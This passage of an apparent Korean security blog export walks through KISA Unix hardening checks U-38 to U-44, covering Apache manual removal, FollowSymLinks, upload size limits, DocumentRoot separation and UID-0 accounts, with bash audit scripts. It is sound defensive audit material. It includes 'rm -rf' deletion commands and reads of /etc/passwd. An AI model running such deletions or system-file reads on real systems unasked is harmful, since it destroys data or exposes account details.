<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>Apache 설치 시 디폴트로 설치되는 불필요한 파일을 제거함을 목적으로 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>Apache 설치 시 <code>htdocs</code> 디렉터리 내에 메뉴얼 파일은 시스템 관련정보를 노출하거나 해킹에 악용될 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 기본으로 생성되는 불필요한 파일 및 디렉터리가 제거되어 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 기본으로 생성되는 불필요한 파일 및 디렉터리가 제거되지 않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>불필요한 파일 및 디렉터리 존재 여부 확인<br />    <code># ls -ld /[Apache_home]/htdocs/manual</code><br />    <code># ls -ld /[Apache_home]/manual</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># find / -name manual</p>
</blockquote>
<br>

<p><code>manual</code> 파일이 있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-38/find.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) <code>ls</code> 명령어로 확인된 메뉴얼 디렉터리 및 파일 제거<br />    <code># rm -rf /[Apache_home]/htdocs/manual</code><br />    <code># rm -rf /[Apache_home]/manual</code><br /><br />2) <code>ls</code> 명령어로 정상적인 제거 확인<br /><br />3) 추가적으로 웹서비스 운영에 불필요한 파일이나 디렉터리가 있을 시 제거</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`find / -name manual`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-38 [웹서비스 불필요한 파일 제거] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-38.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>manual</code> 파일이 있으면 <code>취약</code> 아니면 <code>양호</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-38</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-38/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-39 웹서비스 링크 사용금지</title>
    <url>/2022/01/17/2022-01-17-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-39%20%EC%9B%B9%EC%84%9C%EB%B9%84%EC%8A%A4%20%EB%A7%81%ED%81%AC%20%EC%82%AC%EC%9A%A9%EA%B8%88%EC%A7%80/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>심볼릭 링크, aliases 사용 제한 여부 점검입니다.</p>
<p>항목코드는 <code>U-39</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>무분별한 심볼릭 링크, aliases 사용제한으로 시스템 권한의 탈취 방지를 목적으로 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>웹 루트 폴더를 링크하는 파일이 있으며 디렉터리 인덱싱 기능이 차단되어 있어도 root 디렉터리 열람이 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 심볼릭 링크, aliases 사용을 제한한 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 심볼릭 링크, aliases 사용을 제한하지 않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>Options</code> 지시자 <code>FollowSymLinks</code> 옵션 제거 여부 확인<br />    <code># vi /[Apache_home]/conf/httpd.conf</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/httpd/conf/httpd.conf | grep &quot;FollowSymLinks&quot; | grep &quot;Options&quot;</p>
</blockquote>
<br>

<p><code>FollowSymLinks</code> 옵션이 설정되어 있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-39/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>/[Apache_home]/conf/httpd.conf</code> 파일 열기<br />    <code># vi /[Apache_home]/conf/httpd.conf</code><br /><br />2) 설정된 모든 디렉터리의 <code>Options</code> 지시자에서 <code>FollowSymLinks</code> 옵션 제거</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/httpd/conf/httpd.conf | grep <span class="string">&quot;FollowSymLinks&quot;</span> | grep <span class="string">&quot;Options&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *<span class="string">&quot;FollowSymLinks&quot;</span>* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-39 [웹서비스 링크 사용금지] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-39.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>FollowSymLinks</code> 옵션이 있으면 <code>취약</code> 아니면 <code>양호</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-39</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-39/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-40 웹서비스 파일 업로드 및 다운로드 제한</title>
    <url>/2022/01/18/2022-01-18-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-40%20%EC%9B%B9%EC%84%9C%EB%B9%84%EC%8A%A4%20%ED%8C%8C%EC%9D%BC%20%EC%97%85%EB%A1%9C%EB%93%9C%20%EB%B0%8F%20%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C%20%EC%A0%9C%ED%95%9C/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>파일 업로드 및 다운로드의 사이즈 제한 여부 점검입니다.</p>
<p>항목코드는 <code>U-40</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>기반시설 특성상 원칙적으로 파일 업로드 및 다운로드를 금지하고 있지만 불가피하게 필요시 용량 사이즈를 제한함으로써 불필요한 업로드와 다운로드를 방지해 서버의 과부하 예방 및 자원을 효율적으로 관리하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>악의적 목적을 가진 사용자가 반복 업로드 및 웹 쉘 공격 등으로 시스템 권한을 탈취하거나 대용량 파일의 반복 업로드로 서버자원을 고갈시키는 공격의 위험이 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 파일 업로드 및 다운로드를 제한한 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 파일 업로드 및 다운로드를 제한하지 않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>LimitRequestBody</code> 파일 사이즈 용량 제한 설정 여부 확인<br />    <code># vi /[Apache_home]/conf/httpd.conf</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/httpd/conf/httpd.conf | grep &quot;LimitRequestBody&quot;</p>
</blockquote>
<br>

<p>파일 사이즈 용량 제한이 설정되어 있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-40/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>/[Apache_home]/conf/httpd.conf</code> 파일 열기<br />    <code># vi /[Apache_home]/conf/httpd.conf</code><br /><br />2) 설정된 모든 디렉터리의 <code>LimitRequestBody</code> 지시자에서 파일 사이즈 용량 제한 설정<br />    <img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-40/vi.png"></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/httpd/conf/httpd.conf | grep <span class="string">&quot;LimitRequestBody&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *<span class="string">&quot;5000000&quot;</span>* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-40 [웹서비스 파일 업로드 및 다운로드 제한] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-40.txt</span><br></pre></td></tr></table></figure>

<br>

<p>파일 사이즈 제한 옵션과 권장 용량인 5M이면 <code>양호</code> 없으면 <code>취약</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-40</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-40/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-41 웹서비스 영역의 분리</title>
    <url>/2022/01/18/2022-01-18-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-41%20%EC%9B%B9%EC%84%9C%EB%B9%84%EC%8A%A4%20%EC%98%81%EC%97%AD%EC%9D%98%20%EB%B6%84%EB%A6%AC/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>웹 서버의 루트 디렉터리와 OS의 루트 디렉터리를 다르게 지정하였는지에 대한 점검입니다.</p>
<p>항목코드는 <code>U-41</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>웹 서비스 영역과 시스템 영역을 분리시켜서 웹 서비스의 침해가 시스템 영역으로 확장될 가능성을 최소화하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>웹 서버의 루트 디렉터리와 OS의 루트 디렉터리를 다르게 지정하지 않았을 경우 비인가자가 웹 서비스를 통해 해킹이 성공할 경우 시스템 영역까지 접근이 가능하여 피해가 확장될 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>DocumentRoot</code>를 별도의 디렉터리로 지정한 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>DocumentRoot</code>를 기본 디렉터리로 지정한 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>DocumentRoot</code>의 별도 디렉터리 지정 여부 확인<br />    <code># vi /[Apache_home]/conf/httpd.conf</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/httpd/conf/httpd.conf | grep &#39;DocumentRoot &quot;&#39;</p>
</blockquote>
<br>

<p><code>DocumentRoot</code>의 디렉터리를 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-41/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>/[Apache_home]/conf/httpd.conf</code> 파일 열기<br />    <code># vi /[Apache_home]/conf/httpd.conf</code><br /><br />2) <code>DocumentRoot</code> 설정 부분에 <code>/usr/local/apache/htdocs</code> <code>/usr/local/apache2/htdocs</code> <code>/var/www/html</code> 셋 중 하나가 아닌 별도의 디렉터리로 변경</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/httpd/conf/httpd.conf | grep <span class="string">&#x27;DocumentRoot &quot;&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *<span class="string">&quot;/usr/local/apache/htdocs&quot;</span>* ]] || [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *<span class="string">&quot;/usr/local/apache2/htdocs&quot;</span>* ]] || [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *<span class="string">&quot;/var/www/html&quot;</span>* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-41 [웹서비스 영역의 분리] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-41.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>DocumentRoot</code>의 디렉터리가 <code>/usr/local/apache/htdocs</code> <code>/usr/local/apache2/htdocs</code> <code>/var/www/html</code> 경로라면 <code>취약</code> 아니라면 <code>양호</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-41</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-41/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-44 root 이외의 UID가 &#39;0&#39; 금지</title>
    <url>/2022/01/18/2022-01-18-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-44%20root%20%EC%9D%B4%EC%99%B8%EC%9D%98%20UID%EA%B0%80%20&#39;0&#39;%20%EA%B8%88%EC%A7%80/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>사용자 계정 정보가 저장된 파일 (예 <code>/etc/passwd</code>)에 root(UID=0) 계정과 동일한 UID를 가진 계정이 존재하는지에 대한 점검입니다.</p>
<p>항목코드는 <code>U-44</code>이며, 항목 주요도는 <code>중</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>root 계정과 동일한 UID가 존재하는지 점검하여 root 권한이 일반 사용자 계정이나 비인가자의 접근 위협에 안전하게 보호되고 있는지 확인하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>root 계정과 동일 UID가 설정되어 있는 일반사용자 계정도 root 권한을 부여받아 관리자가 실행 할 수 있는 모든 작업이 가능합니다.</p>
<p>root와 동일한 UID를 사용하므로 사용자 감사 추적 시 어려움이 발생합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : root 계정과 동일한 UID를 갖는 계정이 존재하지 않는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : root 계정과 동일한 UID를 갖는 계정이 존재하는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code># cat /etc/passwd</code> 파일 내 UID 확인 (세 번째 필드 값)<br />root 이외의 계정이 <code>UID=0</code>인 경우 0이 아닌 적적한 UID 부여</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/passwd | grep x:0: | grep -v root</p>
</blockquote>
<br>

<p>root 이외의 계정에서 UID가 0인 계정이 있는지 검색해보았습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-44/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX,<br />HP-UX</td>
<td>1) <code>usermod</code> 명령으로 UID가 0인 일반 계정의 UID를 100 이상으로 수정<br />    SOLARIS, HP-UX의 경우 100 이상<br />    LINUX의 경우 500 이상</td>
</tr>
<tr>
<td>AIX</td>
<td>1) <code>chuser</code> 명령으로 UID가 0인 일반 계정의 UID를 100 이상으로 수정</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/passwd | grep x:0: | grep -v root`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-44 [root 이외의 UID가 <span class="string">&#x27;0&#x27;</span> 금지] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-44.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/passwd</code> 파일에서 root 이외의 계정에서 UID가 0인 계정이 있을 경우 <code>취약</code>, 없으면 <code>양호</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-44</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-44/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
